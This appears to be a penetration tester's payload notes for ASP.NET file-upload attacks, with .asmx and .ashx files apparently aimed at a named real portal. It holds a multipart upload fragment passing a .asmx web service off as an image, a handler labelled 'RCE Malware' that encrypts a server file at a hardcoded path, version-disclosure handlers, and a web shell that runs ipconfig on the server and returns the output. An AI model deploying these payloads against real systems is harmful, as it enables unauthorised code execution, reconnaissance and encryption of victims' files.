==> .asmx hello world
<%@ WebService Language="C#" CodeBehind="~/App_Code/HelloWorld.cs" Class="HelloWorld" %>


using System;
using System.Web.Services;

[WebService(Namespace = "http://portal.sakani.ae/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
[System.ComponentModel.ToolboxItem(false)]
public class HelloWorld : WebService
{
    [WebMethod]
    public string SayHello()
    {
        return "Hello, World!";
    }
	
	
	
==> .asmx .net version
<%@ WebHandler Language="C#" Class="DotNetVersionHandler" %>

using System;
using System.Web;

public class DotNetVersionHandler : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        string dotNetVersion = Environment.Version.ToString();
        context.Response.Write("Current .NET Version: " + dotNetVersion);
    }

    public bool IsReusable
    {
        get { return false; }
    }
}


==> .asmx RCE Malware
Content-Disposition: form-data; name="Image"; filename="ssrfpdf.asmx"
Content-Type: application/xml

<%@ WebService Language="C#" Class="HelloWorld" %>

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Web.Services;

[WebService(Namespace = "http://portal.sakani.ae/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
[System.ComponentModel.ToolboxItem(false)]
public class HelloWorld : WebService
{
    [WebMethod]
    public string EncryptFile()
    {
        try
        {
            // Specify the file path and password
            string filePath = @"E:\Media\HomeAlteration\ssrfpdf233522114.pdf";
            string password = "YourPassword";

            // Construct encrypted file path
            string encryptedFileName = Path.GetFileNameWithoutExtension(filePath) + "-Encrypted" + Path.GetExtension(filePath);
            string encryptedFilePath = Path.Combine(Path.GetDirectoryName(filePath), encryptedFileName);

            using (Aes aes = Aes.Create())
            {
                byte[] salt = new byte[16];
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                using (var rng = new RNGCryptoServiceProvider())
                {
                    rng.GetBytes(salt);
                }

                using (var derivedBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 10000))
                {
                    aes.Key = derivedBytes.GetBytes(32);
                    aes.IV = derivedBytes.GetBytes(16);
                }

                // Encrypt the file
                using (var inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                using (var encryptedFileStream = new FileStream(encryptedFilePath, FileMode.Create, FileAccess.Write))
                using (var cryptoStream = new CryptoStream(encryptedFileStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;

                    while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        cryptoStream.Write(buffer, 0, bytesRead);
                    }
                }
            }

            return "File encrypted successfully. Encrypted file saved as: " + encryptedFileName;
        }
        catch (Exception ex)
        {
            return "Error occurred: " + ex.Message;
        }
    }
}



=====================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================

.ashx .net version
____________________________________________________________________________________
<%@ WebHandler Language="C#" Class="DotNetVersionHandler" %>

using System;
using System.Web;

public class DotNetVersionHandler : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        string dotNetVersion = Environment.Version.ToString();
        context.Response.Write("Current .NET Version: " + dotNetVersion);
    }

    public bool IsReusable
    {
        get { return false; }
    }
}
____________________________________________________________________________________

<%@ WebHandler Language="C#" Class="DotNetVersionHandler" %>

using System;
using System.Web;

public class DotNetVersionHandler : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        string dotNetVersion = Environment.Version.ToString();
        context.Response.Write("Current .NET Version: " + dotNetVersion);
    }

    public bool IsReusable
    {
        get { return false; }
    }
}

____________________________________________________________________________________
____________________________________________________________________________________

.ashx ipconfig

<%@ WebHandler Language="C#" Class="IpConfigHandler" %>

using System;
using System.Diagnostics;
using System.IO;
using System.Web;

public class IpConfigHandler : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
        try
        {
            Process process = new Process();
            process.StartInfo.FileName = "ipconfig";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;

            process.Start();

            // Read the output
            string output = process.StandardOutput.ReadToEnd();

            process.WaitForExit();

            context.Response.ContentType = "text/plain";
            context.Response.Write(output);
        }
        catch (Exception ex)
        {
            context.Response.ContentType = "text/plain";
            context.Response.Write($"Error: {ex.Message}");
        }
    }

    public bool IsReusable
    {
        get { return false; }
    }
}

____________________________________________________________________________________
____________________________________________________________________________________
